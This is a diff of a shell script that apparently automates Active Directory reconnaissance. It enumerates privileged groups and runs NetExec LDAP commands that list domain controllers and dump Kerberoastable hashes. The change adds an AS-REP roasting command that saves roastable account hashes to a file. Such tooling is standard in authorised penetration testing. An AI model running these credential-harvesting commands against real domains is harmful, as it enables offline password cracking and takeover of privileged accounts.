@@ -19,7 +19,6 @@ enumerate_group() {
 enumerate_group "Enterprise Admins"
 enumerate_group "Schema Admins"
 enumerate_group "Domain Admins"
-
 # Enumerate Tier 1 groups
 enumerate_group "Administrators"
 enumerate_group "Account Operators"
@@ -27,13 +26,15 @@ enumerate_group "Backup Operators"
 enumerate_group "Print Operators"
 enumerate_group "Server Operators"
 enumerate_group "Group Policy Creator Owners"
-
 # Enumerate other important groups
 enumerate_group "Denied RODC Password Replication Group"
 enumerate_group "DnsAdmins"
 
 echo "Enumerate Kerberoastable Accounts"
 nxc ldap $target -u "$username" -p "$password" --kerberoasting kerberoasting.txt
+
+echo "Enumerate ASREP Accounts"
+nxc ldap $target -u "$username" -p "$password" --asreproast asreproast.txt
 
 echo "List Domain Controllers"
 nxc ldap $target -u "$username" -p "$password" --dc-list
